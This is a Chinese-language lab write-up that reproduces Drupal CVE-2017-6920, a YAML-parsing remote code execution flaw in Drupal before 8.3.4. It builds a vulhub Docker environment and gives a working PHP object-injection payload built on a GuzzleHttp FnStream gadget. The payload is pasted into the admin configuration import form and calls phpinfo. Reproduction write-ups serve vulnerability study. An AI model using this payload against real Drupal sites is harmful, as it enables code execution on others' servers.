Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由由内容管理系统和PHP开发框架共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。

2017年6月21日，Drupal官方发布了一个编号为CVE-2017- 6920 的漏洞，影响为Critical。这是Drupal
Core的YAML解析器处理不当所导致的一个远程代码执行漏洞。

漏洞影响范围： Drupal < 8.3.4

本文仅作漏洞复现记录与实现，利用流程如下:

一、漏洞环境

本次演示环境采用vulhub搭建，执行以下命令搭建

cd /drupal/CVE-2017-6920/

docker-compose up -d

之后开启了8080端口，访问之后正常安装即可，由于没有mysql环境，所以安装的时候可以选择sqlite数据库

安装完毕之后还需要安装yaml扩展，首先执行docker ps查看容器id

之后执行docker exec -it a3df54b9def6 bash 进入容器命令行后依次执行以下命令

    
    
    # 换镜像源，默认带vim编辑器，所以用cat换源，可以换成自己喜欢的源
    cat > sources.list << EOF
    deb http://mirrors.163.com/debian/ jessie main non-free contrib
    deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib
    deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib
    deb-src http://mirrors.163.com/debian/ jessie main non-free contrib
    deb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib
    deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib
    deb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib
    deb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib
    EOF
    # 安装依赖
    apt update
    apt-get -y install gcc make autoconf libc-dev pkg-config
    apt-get -y install libyaml-dev
    # 安装yaml扩展
    pecl install yaml
    docker-php-ext-enable yaml.so
    # 启用 yaml.decode_php 否则无法复现成功
    echo 'yaml.decode_php = 1 = 1'>>/usr/local/etc/php/conf.d/docker-php-ext-yaml.ini
    # 退出容器
    exit
    # 重启容器，CONTAINER换成自己的容器ID
    docker restart CONTAINER

之后便可以开始复现漏洞了

漏洞链接: <http://192.168.101.152:8080/>

访问之后如下图，注意，复现该漏洞需要登录管理员账户

![1617093776_6062e490d69da582649fb.png!small](https://image.3001.net/images/20210330/1617093776_6062e490d69da582649fb.png!small)

二、漏洞复现

登录一个管理账户

![1617093885_6062e4fd9dbd9fcd5bc71.png!small](https://image.3001.net/images/20210330/1617093885_6062e4fd9dbd9fcd5bc71.png!small)

访问链接http://192.168.101.152:8080/admin/config/development/configuration/single/import

![1617093922_6062e522e968513fd77c0.png!small](https://image.3001.net/images/20210330/1617093922_6062e522e968513fd77c0.png!small)

之后Configuration type选择为Simple configuration，Configuration name可以随便填写，Paste
your configuration here中写入poc：

    
    
    !php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"

![1617094035_6062e5938446840930ae7.png!small](https://image.3001.net/images/20210330/1617094035_6062e5938446840930ae7.png!small)

之后点击左下角的Import按钮便可以触发漏洞

![1617094081_6062e5c1f0a484555a8f5.png!small](https://image.3001.net/images/20210330/1617094081_6062e5c1f0a484555a8f5.png!small)

复现结束。

